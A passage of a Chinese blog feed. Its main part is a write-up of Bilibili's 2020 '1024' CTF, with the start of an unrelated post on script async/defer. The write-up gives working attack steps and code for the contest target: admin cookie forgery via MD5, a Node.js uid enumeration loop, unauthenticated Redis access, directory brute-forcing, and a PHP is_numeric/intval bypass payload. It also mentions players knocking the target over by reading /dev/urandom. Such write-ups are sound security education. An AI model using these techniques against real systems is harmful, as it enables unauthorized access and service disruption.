href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 